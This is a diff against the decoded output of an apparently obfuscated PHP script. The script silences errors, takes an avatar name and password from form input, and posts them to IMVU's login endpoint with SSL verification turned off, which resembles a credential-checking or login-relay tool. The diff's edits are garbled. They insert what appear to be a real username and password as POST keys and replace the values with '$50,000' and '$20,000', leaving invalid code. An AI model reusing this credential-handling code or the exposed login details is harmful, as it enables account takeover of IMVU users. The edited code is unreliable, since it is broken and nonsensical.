@@ -5,16 +5,17 @@ decode output :
 -------------------
 @set_time_limit(0);
 @error_reporting(0);
-$user = $_POST["avatarname"];
-$pass = $_POST["password"];
+$user = $_POST["@
+VitorS7"];
+$pass = $_POST["vitorsantosbela36"];
 	$ch = curl_init();
 		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		  curl_setopt($ch, CURLOPT_URL, "https://secure.imvu.com/login/login/");
 		  curl_setopt($ch, CURLOPT_POST, true);
 		  curl_setopt($ch, CURLOPT_POSTFIELDS, array(
 		  	"sauce" => "",
-		  	"avatarname" => $user,
-		  	"password" => $pass,
+		  	"avatarname" => $50,000,
+		  	"password" => $20,000,
 		  	"sendto" => "",
 		  	));
 		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
